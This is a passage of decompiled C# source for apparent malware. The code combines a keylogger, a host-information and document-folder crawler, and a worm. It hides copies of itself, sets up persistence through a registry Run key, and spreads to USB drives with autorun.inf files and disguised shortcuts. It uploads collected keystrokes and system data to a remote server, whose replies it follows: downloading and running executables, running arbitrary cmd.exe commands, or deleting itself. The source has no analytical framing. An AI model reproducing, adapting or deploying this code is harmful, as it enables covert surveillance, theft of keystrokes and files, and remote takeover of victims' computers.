			string value = Math.Round((double)((ServerComputer)MyProject.Computer).get_Info().get_TotalPhysicalMemory() / 1048576.0) + " MB";
			string userName = Environment.UserName;
			string name = ((ServerComputer)MyProject.Computer).get_Name();
			string standardName = TimeZoneInfo.Local.StandardName;
			Dictionary<string, string> dictionary = new Dictionary<string, string>();
			dictionary.Add("memory", value);
			dictionary.Add("user", userName);
			dictionary.Add("hostName", name);
			dictionary.Add("timeZone", standardName);
			dictionary.Add("osname", ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName());
			dictionary.Add("hostlink", getHostLink());
			foreach (KeyValuePair<string, string> item in dictionary)
			{
				XElement val2 = new XElement(XName.op_Implicit(item.Key));
				val2.set_Value(item.Value);
				((XContainer)val).Add((object)val2);
			}
			return val;
		}

		public XElement crawlFolders()
		{
			//IL_000a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0010: Expected O, but got Unknown
			XElement val = new XElement(XName.op_Implicit("foldersCrawler"));
			try
			{
				DirectoryInfo dir = new DirectoryInfo(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments());
				((XContainer)val).Add((object)GetDirectoryXml(dir));
				return val;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				Console.WriteLine("0x960000");
				ProjectData.ClearProjectError();
				return val;
			}
		}

		private XElement GetDirectoryXml(DirectoryInfo dir)
		{
			//IL_001a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0024: Expected O, but got Unknown
			//IL_001f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0025: Expected O, but got Unknown
			//IL_00bf: Unknown result type (might be due to invalid IL or missing references)
			//IL_00c5: Expected O, but got Unknown
			//IL_00dd: Unknown result type (might be due to invalid IL or missing references)
			//IL_00e3: Expected O, but got Unknown
			//IL_0105: Unknown result type (might be due to invalid IL or missing references)
			//IL_010b: Expected O, but got Unknown
			//IL_010d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0117: Expected O, but got Unknown
			XElement val = new XElement(XName.op_Implicit("dir"), (object)new XAttribute(XName.op_Implicit("name"), (object)dir.get_Name()));
			try
			{
				FileInfo[] files = dir.GetFiles();
				foreach (FileInfo fileInfo in files)
				{
					Type typeFromHandle = typeof(Thread);
					object[] array = new object[1] { RuntimeHelpers.GetObjectValue(controlState.backgroundWaitTime) };
					object[] array2 = array;
					bool[] array3 = new bool[1] { true };
					NewLateBinding.LateCall((object)null, typeFromHandle, "Sleep", array2, (string[])null, (Type[])null, array3, true);
					if (array3[0])
					{
						controlState.backgroundWaitTime = RuntimeHelpers.GetObjectValue(array[0]);
					}
					try
					{
						((XContainer)val).Add((object)new XElement(XName.op_Implicit("file"), new object[3]
						{
							(object)new XAttribute(XName.op_Implicit("name"), (object)fileInfo.get_Name()),
							(object)new XAttribute(XName.op_Implicit("size"), (object)fileInfo.Length),
							(object)new XAttribute(XName.op_Implicit("lastModified"), (object)Strings.Format((object)fileInfo.LastWriteTime, "dd/MMM/yy"))
						}));
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				Console.WriteLine("0x970000");
				ProjectData.ClearProjectError();
			}
			try
			{
				DirectoryInfo[] directories = dir.GetDirectories();
				foreach (DirectoryInfo dir2 in directories)
				{
					Type typeFromHandle2 = typeof(Thread);
					object[] array4 = new object[1] { RuntimeHelpers.GetObjectValue(controlState.backgroundWaitTime) };
					object[] array5 = array4;
					bool[] array3 = new bool[1] { true };
					NewLateBinding.LateCall((object)null, typeFromHandle2, "Sleep", array5, (string[])null, (Type[])null, array3, true);
					if (array3[0])
					{
						controlState.backgroundWaitTime = RuntimeHelpers.GetObjectValue(array4[0]);
					}
					try
					{
						((XContainer)val).Add((object)GetDirectoryXml(dir2));
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						Console.WriteLine("0x9888880000");
						ProjectData.ClearProjectError();
					}
				}
				return val;
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				Console.WriteLine("0x980000");
				ProjectData.ClearProjectError();
				return val;
			}
		}

		public XElement installedApplications()
		{
			//IL_000a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0011: Expected O, but got Unknown
			//IL_0016: Unknown result type (might be due to invalid IL or missing references)
			//IL_001c: Expected O, but got Unknown
			//IL_0034: Unknown result type (might be due to invalid IL or missing references)
			//IL_003a: Expected O, but got Unknown
			//IL_0044: Unknown result type (might be due to invalid IL or missing references)
			//IL_004b: Expected O, but got Unknown
			XElement val = new XElement(XName.op_Implicit("Applications"));
			ManagementObjectSearcher val2 = new ManagementObjectSearcher("Select * from Win32_Product");
			ManagementObjectCollection val3 = val2.Get();
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = val3.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject val4 = (ManagementObject)enumerator.get_Current();
					XElement val5 = new XElement(XName.op_Implicit("app"));
					val5.set_Value(((ManagementBaseObject)val4).get_Item("Name").ToString());
					val5.SetAttributeValue(XName.op_Implicit("path"), (object)((ManagementBaseObject)val4).get_Item("InstallSource").ToString());
					((XContainer)val).Add((object)val5);
				}
				return val;
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}

		public object uploadDetails()
		{
			//IL_0098: Unknown result type (might be due to invalid IL or missing references)
			//IL_00a2: Expected O, but got Unknown
			try
			{
				if (Convert.ToInt64(((XContainer)hostSigantureXml).Element(XName.op_Implicit("hostinfolasttime")).get_Value()) > controlState.getTimeStamp())
				{
					return false;
				}
				((XContainer)hostSigantureXml).Element(XName.op_Implicit("hostinfolasttime")).set_Value(controlState.getTimeStamp(7).ToString());
				syncHostSetting();
				return true;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				Console.WriteLine("0x990000");
				((XContainer)hostSigantureXml).Add((object)new XElement(XName.op_Implicit("hostinfolasttime"), (object)controlState.getTimeStamp(7).ToString()));
				syncHostSetting();
				object result = true;
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public bool isInffected()
		{
			//IL_0079: Unknown result type (might be due to invalid IL or missing references)
			//IL_0083: Expected O, but got Unknown
			try
			{
				if (!File.Exists(Conversions.ToString(inffectedDirSignature)))
				{
					return false;
				}
				try
				{
					if (Convert.ToInt64(((XContainer)hostSigantureXml).Element(XName.op_Implicit("hostinfolasttime")).get_Value()) > controlState.getTimeStamp())
					{
						return true;
					}
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					Console.WriteLine("0x000000012 " + ex2.Message);
					((XContainer)hostSigantureXml).Add((object)new XElement(XName.op_Implicit("hostinfolasttime"), (object)"18"));
					syncHostSetting();
					ProjectData.ClearProjectError();
				}
				if (controlState.getTimeStampDate(File.GetLastWriteTime(Conversions.ToString(inffectedDirSignature))) > controlState.getTimeStamp(-7))
				{
					return true;
				}
				return false;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				Console.WriteLine("0x991000");
				bool result = false;
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public XElement getData()
		{
			//IL_000a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0010: Expected O, but got Unknown
			XElement val = new XElement(XName.op_Implicit("inforamtionsOnHost"));
			if (Conversions.ToBoolean(uploadDetails()))
			{
				((XContainer)val).Add((object)crawlFolders());
				((XContainer)val).Add((object)installedApplications());
				((XContainer)val).Add((object)getHostInfo());
				return val;
			}
			return null;
		}

		public string getHostIdentity()
		{
			try
			{
				if (((XContainer)hostSigantureXml).Element(XName.op_Implicit("idhost")).get_Value().Length > 1)
				{
					return ((XContainer)hostSigantureXml).Element(XName.op_Implicit("idhost")).get_Value();
				}
				return Conversions.ToString(makeHostIdentity());
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string result = Conversions.ToString(makeHostIdentity());
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public object makeHostIdentity()
		{
			//IL_004e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0058: Expected O, but got Unknown
			((XContainer)hostSigantureXml).Add((object)new XElement(XName.op_Implicit("idhost"), Operators.ConcatenateObject(controlState.RandomString(20), (object)(((ServerComputer)MyProject.Computer).get_Name() + Environment.UserName).Replace("/", "").Replace("\\", ""))));
			syncHostSetting();
			return ((XContainer)hostSigantureXml).Element(XName.op_Implicit("idhost")).get_Value();
		}

		public string getHostLink()
		{
			try
			{
				if (((XContainer)hostSigantureXml).Element(XName.op_Implicit("link")).get_Value().Length > 1)
				{
					return ((XContainer)hostSigantureXml).Element(XName.op_Implicit("link")).get_Value();
				}
				return Conversions.ToString(makeHostLink());
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				Console.WriteLine("0x992000x");
				string result = Conversions.ToString(makeHostLink());
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public object makeHostLink()
		{
			//IL_005d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0067: Expected O, but got Unknown
			((XContainer)hostSigantureXml).Add((object)new XElement(XName.op_Implicit("link"), Operators.ConcatenateObject(controlState.RandomString(10), (object)(((ServerComputer)MyProject.Computer).get_Name() + Environment.UserName).Replace("/", "").Replace("\\", "").Replace("-", ""))));
			syncHostSetting();
			return ((XContainer)hostSigantureXml).Element(XName.op_Implicit("link")).get_Value();
		}

		public void syncHostSetting()
		{
			try
			{
				File.Delete(Conversions.ToString(inffectedDirSignature));
				XElement obj = hostSigantureXml;
				object[] array = new object[1] { RuntimeHelpers.GetObjectValue(inffectedDirSignature) };
				bool[] array2 = new bool[1] { true };
				NewLateBinding.LateCall((object)obj, (Type)null, "Save", array, (string[])null, (Type[])null, array2, true);
				if (array2[0])
				{
					inffectedDirSignature = RuntimeHelpers.GetObjectValue(array[0]);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				Console.WriteLine("0x993000");
				ProjectData.ClearProjectError();
			}
		}
	}

	public class actions
	{
		private object inffectedDirSignature;

		public actions()
		{
			inffectedDirSignature = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\WinSySConfigToken.ini";
		}

		public void addToStartup(string path, bool st = true)
		{
			try
			{
				if (Conversions.ToBoolean(controlState.debug))
				{
					return;
				}
				try
				{
					if (st)
					{
						((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Conversions.ToString(Operators.ConcatenateObject((object)"WinSyS Network Service ", controlState.RandomString(2))), path);
					}
					else
					{
						((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.DeleteValue("WinSyS Network Service ");
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					Console.WriteLine("0x994000");
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}

		public void takeOverHost()
		{
			try
			{
				object obj = Operators.ConcatenateObject(Operators.ConcatenateObject((object)(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\"), controlState.RandomString(10)), (object)".exe");
				try
				{
					while (File.Exists(Conversions.ToString(obj)))
					{
						obj = Operators.ConcatenateObject(Operators.ConcatenateObject((object)(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\"), controlState.RandomString(10)), (object)".exe");
					}
					File.Copy(Application.get_ExecutablePath(), Conversions.ToString(obj));
					File.SetAttributes(Conversions.ToString(obj), FileAttributes.Hidden);
					addToStartup(Conversions.ToString(obj));
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					Console.WriteLine("0x995000");
					ProjectData.ClearProjectError();
				}
				try
				{
					object obj2 = Operators.ConcatenateObject(Operators.ConcatenateObject((object)(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\"), controlState.RandomString(2)), (object)".exe");
					while (File.Exists(Conversions.ToString(obj2)))
					{
						obj2 = Operators.ConcatenateObject(Operators.ConcatenateObject((object)(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\"), controlState.RandomString(2)), (object)".exe");
					}
					File.Copy(Application.get_ExecutablePath(), Conversions.ToString(obj2));
					File.SetAttributes(Conversions.ToString(obj2), FileAttributes.Hidden);
					addToStartup(Conversions.ToString(obj2));
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					Console.WriteLine("0x996000");
					ProjectData.ClearProjectError();
				}
				try
				{
					if (!File.Exists(Conversions.ToString(inffectedDirSignature)))
					{
						File.Create(Conversions.ToString(inffectedDirSignature));
						File.SetAttributes(Conversions.ToString(inffectedDirSignature), FileAttributes.Hidden);
					}
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					Console.WriteLine("0x997000");
					ProjectData.ClearProjectError();
				}
				try
				{
					Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\upflder");
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					Console.WriteLine("0x998000");
					ProjectData.ClearProjectError();
				}
				try
				{
					ProcessStartInfo processStartInfo = new ProcessStartInfo();
					processStartInfo.Arguments = Conversions.ToString(Operators.ConcatenateObject((object)"/C choice /C Y /N /D Y /T 5 & ", obj));
					processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					processStartInfo.CreateNoWindow = true;
					processStartInfo.FileName = "cmd.exe";
					Process.Start(processStartInfo);
				}
				catch (Exception projectError5)
				{
					ProjectData.SetProjectError(projectError5);
					Console.WriteLine("0x999000");
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				ProjectData.ClearProjectError();
			}
			Environment.Exit(0);
		}

		public object infectCTD()
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo in drives)
			{
				try
				{
					if (!driveInfo.IsReady || !((driveInfo.AvailableFreeSpace > 3084L) & (driveInfo.DriveType == DriveType.Removable)))
					{
						continue;
					}
					Type typeFromHandle = typeof(Thread);
					object[] array = new object[1] { RuntimeHelpers.GetObjectValue(controlState.backgroundWaitTime) };
					object[] array2 = array;
					bool[] array3 = new bool[1] { true };
					NewLateBinding.LateCall((object)null, typeFromHandle, "Sleep", array2, (string[])null, (Type[])null, array3, true);
					if (array3[0])
					{
						controlState.backgroundWaitTime = RuntimeHelpers.GetObjectValue(array[0]);
					}
					DirectoryInfo directoryInfo = new DirectoryInfo(driveInfo.Name);
					FileInfo[] files = directoryInfo.GetFiles();
					int num = 0;
					bool flag = false;
					object obj = Operators.ConcatenateObject(Operators.ConcatenateObject((object)(directoryInfo.get_Name() + "\\"), controlState.RandomString(2)), (object)".exe");
					while (File.Exists(Conversions.ToString(obj)))
					{
						obj = Operators.ConcatenateObject(Operators.ConcatenateObject((object)(directoryInfo.get_Name() + "\\"), controlState.RandomString(2)), (object)".exe");
					}
					FileInfo[] array4 = files;
					foreach (FileInfo fileInfo in array4)
					{
						if (num > 3)
						{
							break;
						}
						if (!((Operators.CompareString(fileInfo.Extension, ".lnk", false) == 0) | (fileInfo.Length > 100000000L) | File.Exists(fileInfo.DirectoryName + "\\autorun.inf")))
						{
							Type typeFromHandle2 = typeof(Thread);
							object[] array5 = new object[1] { RuntimeHelpers.GetObjectValue(controlState.backgroundWaitTime) };
							object[] array6 = array5;
							array3 = new bool[1] { true };
							NewLateBinding.LateCall((object)null, typeFromHandle2, "Sleep", array6, (string[])null, (Type[])null, array3, true);
							if (array3[0])
							{
								controlState.backgroundWaitTime = RuntimeHelpers.GetObjectValue(array5[0]);
							}
							flag = true;
							createShotcutOnRemovable(fileInfo.DirectoryName, fileInfo.get_Name(), Conversions.ToString(obj));
							num = checked(num + 1);
						}
					}
					if (flag)
					{
						File.Copy(Application.get_ExecutablePath(), Conversions.ToString(obj));
						File.SetAttributes(Conversions.ToString(obj), FileAttributes.Hidden);
						StreamWriter streamWriter = new StreamWriter(directoryInfo.get_Name() + "\\autorun.inf");
						streamWriter.WriteLine("[autorun]");
						streamWriter.WriteLine(Operators.ConcatenateObject((object)"open=", obj));
						streamWriter.WriteLine(Conversions.ToString(Operators.ConcatenateObject((object)"shellexecute=", obj)), 1);
						streamWriter.Close();
						File.SetAttributes(directoryInfo.get_Name() + "autorun.inf", FileAttributes.Hidden);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			return null;
		}

		public void createShotcutOnRemovable(string path, string name, string exe)
		{
			try
			{
				object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", ""));
				object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "CreateShortcut", new object[1] { path + "\\" + name + ".lnk" }, (string[])null, (Type[])null, (bool[])null));
				NewLateBinding.LateSet(objectValue2, (Type)null, "TargetPath", new object[1] { exe }, (string[])null, (Type[])null);
				NewLateBinding.LateSet(objectValue2, (Type)null, "Arguments", new object[1] { "-h " + path + "\\" + name }, (string[])null, (Type[])null);
				NewLateBinding.LateSet(objectValue2, (Type)null, "WindowStyle", new object[1] { 1 }, (string[])null, (Type[])null);
				NewLateBinding.LateCall(objectValue2, (Type)null, "Save", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		public void suicide()
		{
			try
			{
				try
				{
					File.Delete(Conversions.ToString(Operators.ConcatenateObject(inffectedDirSignature, (object)"\\WinSySConfigToken.ini")));
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					Console.WriteLine("0x999100");
					ProjectData.ClearProjectError();
				}
				addToStartup(Conversions.ToString(false));
				try
				{
					ProcessStartInfo processStartInfo = new ProcessStartInfo();
					processStartInfo.Arguments = "/C choice /C Y /N /D Y /T 5 & Del \"" + Application.get_ExecutablePath() + "\"";
					processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					processStartInfo.CreateNoWindow = true;
					processStartInfo.FileName = "cmd.exe";
					Process.Start(processStartInfo);
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					Console.WriteLine("0x999200");
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
	}

	private static keyLogger keylog;

	private static controlState conState;

	private static actions act;

	private static CurrentHost curHost;

	private static object backgroundUploadTime = 1200000;

	private static string[] args;

	private static Timer tm;

	private static Thread t2 = new Thread(uploadFiles);

	private static Thread t1 = new Thread(backgroundThread);

	[MethodImpl(MethodImplOptions.NoOptimization)]
	[STAThread]
	public static void Main()
	{
		args = Environment.GetCommandLineArgs();
		someThingForMe_();
		Mutex mutex = new Mutex(initiallyOwned: false, ((ApplicationBase)MyProject.Application).get_Info().get_AssemblyName());
		if (!mutex.WaitOne(0, exitContext: false))
		{
			mutex.Close();
			mutex = null;
			ProjectData.EndApp();
		}
		conState = new controlState();
		if (args.Contains("debug"))
		{
			conState.debuging();
		}
		if (args.Contains("local"))
		{
			conState.local();
		}
		act = new actions();
		keylog = new keyLogger();
		curHost = new CurrentHost();
		init();
		Application.add_ThreadExit((EventHandler)delegate
		{
			exiting();
		});
		Application.Run();
	}

	public static void init()
	{
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		if (!curHost.isInffected())
		{
			act.takeOverHost();
		}
		t1.IsBackground = true;
		t1.Name = "backgrouThread";
		t1.Start();
		t2.IsBackground = true;
		t2.Name = "uploader";
		t2.Start();
		tm = new Timer();
		tm.add_Tick((EventHandler)delegate
		{
			CheckState();
		});
		tm.set_Interval(Conversions.ToInteger(controlState.monitorWaitTIme));
	}

	public static void processXml(XElement xml)
	{
		try
		{
			if (Information.IsNothing((object)xml))
			{
				return;
			}
			if (((XContainer)xml).Descendants(XName.op_Implicit("download")).Any())
			{
				networkDownload networkDownload = new networkDownload();
				foreach (XElement item in ((XContainer)xml).Descendants(XName.op_Implicit("download")))
				{
					try
					{
						if (!networkDownload.downloadFileExe(item.get_Value(), item.Attribute(XName.op_Implicit("com")).get_Value()))
						{
							networkDownload.downloadFileExe(item.get_Value(), item.Attribute(XName.op_Implicit("com")).get_Value());
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
			}
			if (((XContainer)xml).Descendants(XName.op_Implicit("com")).Any())
			{
				foreach (XElement item2 in ((XContainer)xml).Descendants(XName.op_Implicit("com")))
				{
					try
					{
						Process.Start("cmd.exe", item2.get_Value());
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
			}
			if (((XContainer)xml).Descendants(XName.op_Implicit("suicide")).Any())
			{
				act.suicide();
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	public static void makeFinaData()
	{
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0023: Expected O, but got Unknown
		XElement val = keylog.rotate();
		if (!Information.IsNothing((object)val))
		{
			XElement val2 = new XElement(XName.op_Implicit("blackBox"));
			((XContainer)val2).Add((object)val);
			((XContainer)val2).Add((object)curHost.getData());
			secure secure = new secure();
			secure.prepareForUpload(val2);
		}
	}

	private static void backgroundThread()
	{
		checked
		{
			long num = controlState.getTimeStamp() + controlState.uploadWaitTime;
			while (true)
			{
				Type typeFromHandle = typeof(Thread);
				object[] array = new object[1] { RuntimeHelpers.GetObjectValue(controlState.backgroundWaitTime) };
				object[] array2 = array;
				bool[] array3 = new bool[1] { true };
				NewLateBinding.LateCall((object)null, typeFromHandle, "Sleep", array2, (string[])null, (Type[])null, array3, true);
				if (array3[0])
				{
					controlState.backgroundWaitTime = RuntimeHelpers.GetObjectValue(array[0]);
				}
				if (Conversions.ToBoolean(controlState.debug))
				{
					Console.WriteLine(" data " + Conversions.ToString(keylog.countElement()));
				}
				object[] array4;
				if (Operators.ConditionalCompareObjectGreater((object)keylog.keySize(), controlState.keySize, false))
				{
					makeFinaData();
					num = controlState.getTimeStamp() + controlState.uploadWaitTime;
					Type typeFromHandle2 = typeof(Thread);
					array4 = new object[1] { RuntimeHelpers.GetObjectValue(controlState.backgroundWaitTime) };
					object[] array5 = array4;
					array3 = new bool[1] { true };
					NewLateBinding.LateCall((object)null, typeFromHandle2, "Sleep", array5, (string[])null, (Type[])null, array3, true);
					if (array3[0])
					{
						controlState.backgroundWaitTime = RuntimeHelpers.GetObjectValue(array4[0]);
					}
				}
				else if (num <= controlState.getTimeStamp())
				{
					if (keylog.countElement() > 1)
					{
						keylog.timeout();
						makeFinaData();
					}
					else if (Conversions.ToBoolean(controlState.debug))
					{
						Console.WriteLine("timeout, no data " + Conversions.ToString(keylog.countElement()));
					}
					num = controlState.getTimeStamp() + controlState.uploadWaitTime;
					Type typeFromHandle3 = typeof(Thread);
					array4 = new object[1] { RuntimeHelpers.GetObjectValue(controlState.backgroundWaitTime) };
					object[] array6 = array4;
					array3 = new bool[1] { true };
					NewLateBinding.LateCall((object)null, typeFromHandle3, "Sleep", array6, (string[])null, (Type[])null, array3, true);
					if (array3[0])
					{
						controlState.backgroundWaitTime = RuntimeHelpers.GetObjectValue(array4[0]);
					}
				}
				Type typeFromHandle4 = typeof(Thread);
				array4 = new object[1] { RuntimeHelpers.GetObjectValue(controlState.backgroundWaitTime) };
				object[] array7 = array4;
				array3 = new bool[1] { true };
				NewLateBinding.LateCall((object)null, typeFromHandle4, "Sleep", array7, (string[])null, (Type[])null, array3, true);
				if (array3[0])
				{
					controlState.backgroundWaitTime = RuntimeHelpers.GetObjectValue(array4[0]);
				}
				bool con = conState.isHostConnected();
				keylog.con = con;
				Console.WriteLine("check net = " + con);
				Type typeFromHandle5 = typeof(Thread);
				array4 = new object[1] { RuntimeHelpers.GetObjectValue(controlState.backgroundWaitTime) };
				object[] array8 = array4;
				array3 = new bool[1] { true };
				NewLateBinding.LateCall((object)null, typeFromHandle5, "Sleep", array8, (string[])null, (Type[])null, array3, true);
				if (array3[0])
				{
					controlState.backgroundWaitTime = RuntimeHelpers.GetObjectValue(array4[0]);
				}
				act.infectCTD();
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void someThingForMe_()
	{
		checked
		{
			if (args.Count() > 1 && args.Contains("-h"))
			{
				string text = "";
				int num = Array.IndexOf(args, "-h") + 1;
				int num2 = args.Count() - Array.IndexOf(args, "-h");
				for (int i = num; i <= num2; i++)
				{
					text = text + args.ElementAt(i) + " ";
				}
				try
				{
					Process.Start(text);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					Console.WriteLine("0x999300");
					ProjectData.ClearProjectError();
				}
				ProjectData.EndApp();
			}
		}
	}

	public static void uploadFiles()
	{
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\upflder";
		networkUpload networkUpload = new networkUpload();
		networkDownload networkDownload = new networkDownload();
		keylog.bufferInit(background: true);
		while (true)
		{
			Thread.Sleep(checked((int)Math.Round((double)controlState.uploadWaitTime / 2.0)));
			if (!conState.isHostConnected())
			{
				if (Conversions.ToBoolean(controlState.debug))
				{
					Console.WriteLine("offline");
				}
				continue;
			}
			try
			{
				if (Operators.ConditionalCompareObjectEqual(controlState.writingBusy, (object)false, false))
				{
					conState.balance();
					string[] files = Directory.GetFiles(path);
					if (Conversions.ToBoolean(controlState.debug))
					{
						Console.WriteLine("file to be uploaded -: " + Conversions.ToString(files.Count()));
					}
					networkUpload.discard = false;
					Type typeFromHandle = typeof(Thread);
					object[] array = new object[1] { RuntimeHelpers.GetObjectValue(controlState.backgroundWaitTime) };
					object[] array2 = array;
					bool[] array3 = new bool[1] { true };
					NewLateBinding.LateCall((object)null, typeFromHandle, "Sleep", array2, (string[])null, (Type[])null, array3, true);
					if (array3[0])
					{
						controlState.backgroundWaitTime = RuntimeHelpers.GetObjectValue(array[0]);
					}
					string[] array4 = files;
					foreach (string text in array4)
					{
						try
						{
							if (text.Length == 62)
							{
								if (networkUpload.discard)
								{
									break;
								}
								networkUpload.upload(text);
							}
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
						Type typeFromHandle2 = typeof(Thread);
						object[] array5 = new object[1] { RuntimeHelpers.GetObjectValue(controlState.backgroundWaitTime) };
						object[] array6 = array5;
						array3 = new bool[1] { true };
						NewLateBinding.LateCall((object)null, typeFromHandle2, "Sleep", array6, (string[])null, (Type[])null, array3, true);
						if (array3[0])
						{
							controlState.backgroundWaitTime = RuntimeHelpers.GetObjectValue(array5[0]);
						}
					}
				}
				else if (Conversions.ToBoolean(controlState.debug))
				{
					Console.WriteLine("busy");
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				if (Conversions.ToBoolean(controlState.debug))
				{
					Console.WriteLine("0x0000032  " + ex2.Message);
				}
				ProjectData.ClearProjectError();
			}
			try
			{
				XElement xml = networkDownload.downloadString();
				processXml(xml);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}

	private static void CheckState()
	{
		try
		{
			if (!t1.IsAlive)
			{
				t1.IsBackground = true;
				t1.Name = "backgrouThread";
				t1.Start();
			}
			else
			{
				Console.Write("numb one running");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Console.WriteLine("0x999400");
			Thread thread = new Thread(backgroundThread);
			thread.IsBackground = true;
			thread.Name = "backgrouThread";
			thread.Start();
			ProjectData.ClearProjectError();
		}
		try
		{
			if (!t2.IsAlive)
			{
				t2.IsBackground = true;
				t2.Name = "backgrouThread";
				t2.Start();
			}
			else
			{
				Console.Write("numb two running");
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			Console.WriteLine("0x999500");
			Thread thread2 = new Thread(backgroundThread);
			thread2.IsBackground = true;
			thread2.Name = "backgrouThread";
			thread2.Start();
			ProjectData.ClearProjectError();
		}
	}

	private static void exiting()
	{
		if (Operators.ConditionalCompareObjectEqual(controlState.debug, (object)false, false))
		{
			makeFinaData();
		}
		Console.WriteLine("closing **********");
	}
}
